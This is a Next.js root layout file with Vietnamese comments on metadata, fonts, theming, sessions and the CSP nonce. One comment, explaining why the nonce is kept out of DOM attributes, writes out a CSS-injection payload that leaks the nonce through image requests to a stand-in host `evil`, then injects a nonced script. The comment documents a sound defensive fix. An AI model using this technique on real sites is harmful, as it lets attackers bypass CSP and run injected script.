import type { ReactNode } from 'react';
import type { Metadata } from 'next';
import { headers } from 'next/headers';
import { Be_Vietnam_Pro } from 'next/font/google';
import { THEME_INIT_SCRIPT, ThemeProvider, Toaster, TooltipProvider } from '@devops-platform/ui';
import { MotionProvider } from '@devops-platform/motion/provider';
import { t } from '@devops-platform/copy';
import { appUrl } from '../server/env';
import { readRequestSession } from '../server/auth/config';
import { AppShell } from '../components/shell/app-shell';
import { normalizeRole, type Viewer } from '../components/shell/nav';
import './globals.css';

const base = appUrl();

export const metadata: Metadata = {
  title: t('shell.brand.name'),
  description: t('common.meta-description'),
  // Bỏ hẳn key khi APP_URL chưa đặt, thay vì đoán một origin. `new URL()` trên
  // chuỗi rác ném lỗi ngay lúc build — đúng chỗ để phát hiện, không phải lúc có
  // người share link và thấy og:image trỏ về localhost.
  ...(base === undefined ? {} : { metadataBase: new URL(base) }),
  /*
   * P16 16.A.10 — biểu tượng dựng từ file vector chính thức của PTIT, commit
   * thẳng vào `apps/web/public/`. Không hotlink được: CSP `img-src 'self' data:`
   * (`server/security/headers.ts`) chặn mọi origin khác.
   *
   * Chỉ khai SVG, KHÔNG có `.ico`/`.png` — và đó là giới hạn có thật chứ không
   * phải bỏ sót. Dựng raster cần một bộ rasteriser (sharp / resvg / canvas);
   * kiểm 2026-09-10: không gói nào trong số đó có trong `node_modules`, mà lane
   * này bị cấm chạy `pnpm install` vì lockfile là tài nguyên dùng chung. Trình
   * duyệt hiện đại nhận `image/svg+xml` cho `rel="icon"`; máy cũ không nhận thì
   * rơi về không có biểu tượng, không vỡ trang.
   */
  icons: {
    icon: [{ url: '/favicon.svg', type: 'image/svg+xml' }],
  },
  /*
   * KHÔNG khai `images` ở đây. `app/opengraph-image.tsx` tự nối vào metadata:
   * Next sinh `og:image`, `og:image:width/height/type` và `twitter:image` từ
   * chính route đó, nên khai thêm ở đây là dựng nguồn sự thật thứ hai.
   *
   * Bản trước trỏ vào `public/og.svg` và đã bị bỏ (2026-09-10): SVG hợp lệ với
   * trình duyệt nhưng Facebook, LinkedIn, Slack, Zalo chỉ tài liệu hoá
   * JPEG/PNG/GIF/WEBP — ảnh share sẽ trống mà không có gì trong build báo.
   */
  openGraph: {
    type: 'website',
    locale: 'vi_VN',
    siteName: t('shell.brand.name'),
    title: t('shell.brand.name'),
    description: t('common.og-description'),
  },
};

/**
 * D3 — Be Vietnam Pro là font DUY NHẤT dùng cho `--font-sans` (xem globals.css
 * `@theme inline`). subsets `latin` + `vietnamese` là bắt buộc: thiếu
 * `vietnamese` thì các glyph có dấu nặng/ngã/ơ/ư KHÔNG nằm trong font đã tải,
 * trình duyệt fallback sang font hệ thống cho riêng những ký tự đó — chữ vỡ
 * NGAY GIỮA một từ. ⛔ KHÔNG Poppins — Poppins không phủ bảng chữ tiếng Việt.
 *
 * `next/font/google` tự host font (không gọi Google Fonts lúc runtime), nên
 * CSP `font-src 'self'` (`apps/web/src/server/security/headers.ts`) không
 * cần đổi gì.
 */
const beVietnamPro = Be_Vietnam_Pro({
  subsets: ['latin', 'vietnamese'],
  weight: ['400', '500', '600', '700'],
  variable: '--font-be-vietnam-pro',
  display: 'swap',
});

/**
 * `nonce` đọc từ header `x-nonce` mà `src/proxy.ts` gắn vào mỗi request (luật 9
 * — CSP `script-src` dùng nonce thay vì `unsafe-inline`). Next tự gắn nonce này vào
 * script inline nó tự chèn khi thấy header CSP có `nonce-...` trên response.
 *
 * `THEME_INIT_SCRIPT` (D2/C1, `packages/ui`) đặt class `dark` trên `<html>`
 * TRƯỚC PAINT — phải nằm trong `<head>`, mang CÙNG nonce, và chạy TRƯỚC khi
 * React hydrate `<body>` để không nháy màu (FOUC) giữa theme sáng/tối.
 *
 * ⛔ S3 — KHÔNG BAO GIỜ in nonce ra một thuộc tính DOM (`<body data-nonce={nonce}>`
 * từng ở đây). Nonce chỉ có giá trị khi kẻ tấn công KHÔNG đọc được nó; in ra DOM
 * là tự tay huỷ tính chất đó. Cụ thể: CSP của ta còn `style-src 'unsafe-inline'`,
 * nên một lỗ chèn HTML **không cần script** vẫn nhét được
 * `<style>body[data-nonce^="a"]{background:url(https://evil/a)}…</style>` và dò
 * từng ký tự nonce qua các request ảnh — rồi chèn `<script nonce=…>` hợp lệ, mà
 * `'strict-dynamic'` sẽ cho script đó nạp tiếp bất cứ gì.
 *
 * Script inline vẫn nhận nonce qua thuộc tính `nonce` THẬT ở dưới — trình duyệt
 * che giá trị đó khỏi `getAttribute` sau khi phân tích xong, nên nó không dò
 * được như `data-*`. Cần kiểm nonce trong test thì đọc HTML THÔ của response
 * (`e2e/csp.spec.ts` làm đúng vậy), đừng đọc DOM.
 */
export default async function RootLayout({ children }: { children: ReactNode }) {
  const requestHeaders = await headers();
  const nonce = requestHeaders.get('x-nonce') ?? undefined;

  /*
   * 13.B — vai trò cho vỏ ứng dụng lấy từ **session phía server**, không từ bất
   * kỳ thứ gì client tự khai. Ở đây nó chỉ quyết định ẨN/HIỆN liên kết; cổng
   * thật là `layout.tsx` server của `/author` và `/admin` (`getSession` + role →
   * `redirect('/me')`, hợp đồng C6) — giấu một mục menu không chặn được ai gõ
   * thẳng đường dẫn.
   *
   * ⚠ Đây là lượt `getSession` THỨ HAI trên mỗi request của các nhánh đã có
   * layout gác auth riêng (`/lessons`, `/labs`, `/me`, …) — hai lượt đụng DB
   * cho cùng một câu trả lời. Gỡ được bằng cách bọc `getSession` trong `cache()`
   * của React ở `server/auth/config.ts`, nhưng file đó thuộc lane BE1 nên lane
   * này KHÔNG sửa; đã ghi vào report. Không có cách nào để layout con nhận prop
   * từ layout cha trong App Router, nên "chỉ gọi ở root" không phải lựa chọn.
   */
  const session = await readRequestSession();
  const viewer: Viewer | null =
    session === null
      ? null
      : {
          name: session.user.name,
          email: session.user.email,
          role: normalizeRole(session.user.role),
        };

  return (
    <html lang="vi" className={beVietnamPro.variable} suppressHydrationWarning>
      <head>
        <script nonce={nonce} dangerouslySetInnerHTML={{ __html: THEME_INIT_SCRIPT }} />
      </head>
      <body className="min-h-screen bg-background text-foreground antialiased">
        <ThemeProvider>
          {/*
            Giảm chuyển động cần CẢ HAI tầng. Khối `@media` trong `globals.css`
            phủ `transition/animation-duration`; `MotionProvider` phủ thứ
            framer-motion ghi thẳng vào style theo từng khung hình, thứ mà một
            `@media` không chạm tới. Thiếu tầng này thì trang TRÔNG NHƯ đã tuân
            thủ, vì nửa CSS thì tuân thủ thật. Xem `packages/motion/src/motion-provider.tsx`.
          */}
          <MotionProvider>
            <TooltipProvider delayDuration={300}>
              <AppShell viewer={viewer}>{children}</AppShell>
              <Toaster />
            </TooltipProvider>
          </MotionProvider>
        </ThemeProvider>
      </body>
    </html>
  );
}
